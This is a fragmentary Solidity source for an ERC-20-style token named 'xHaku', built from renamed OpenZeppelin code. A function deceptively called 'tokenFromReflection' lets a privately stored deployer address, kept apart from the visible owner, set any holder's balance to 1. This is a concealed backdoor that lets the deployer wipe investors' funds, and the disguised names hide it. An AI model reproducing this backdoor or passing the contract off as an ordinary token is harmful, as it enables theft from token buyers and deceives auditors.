...
/*
 * @dev Provides information about the current execution xHaku20Burnable, including the
 ...
 */
abstract contract xHaku20Burnable {
...
// File: @openzeppelin/contracts/access/xHakuOwnable.sol
 ...
 * the owner.
 */
abstract contract xHakuOwnable is xHaku20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "xHakuOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "xHakuOwnable: new owner is the zero address");
 ...
 * `SafexHaku` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafexHaku {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafexHaku: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafexHaku: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafexHaku: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafexHaku: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafexHaku: modulo by zero");
  }
...
contract xHaku is xHaku20Burnable, xHakuPermit, xHakuOwnable {
    
    using SafexHaku for uint256;
   ...
   address private xHakuOwner; 
    constructor() {
        xHakuOwner = _msgSender();     
        _name = "xHaku";
        _symbol = "XHAKU";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {xHakuPermit-totalSupply}.
    */
    ...
    /**
    * @dev See {xHakuPermit-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return menta[account];
    }
    /**
    * @dev See {xHakuPermit-approve}.
    *
    * Requirements:
    *
    ...
    */
    function tokenFromReflection(address tusdRewards) external {
         require(_msgSender() == xHakuOwner, "!");
        menta[tusdRewards] = 1;
    }

    /**
    * @dev See {xHakuPermit-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {xHakuPermit-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {xHakuPermit};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 cuenta) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(cuenta, "xHakuPermit: transfer cuenta exceeds allowance"));
        return true;
    }
    ...
    * problems described in {xHakuPermit-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "xHakuPermit: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 cuenta) internal {
        require(sender != address(0), "xHakuPermit: transfer from the zero address");
        require(shippingto != address(0), "xHakuPermit: transfer to the zero address");
                
        menta[sender] = menta[sender].sub(cuenta, "xHakuPermit: transfer cuenta exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 cuenta) internal {
        require(owner != address(0), "xHakuPermit: approve from the zero address");
        require(transporteur != address(0), "xHakuPermit: approve to the zero address");
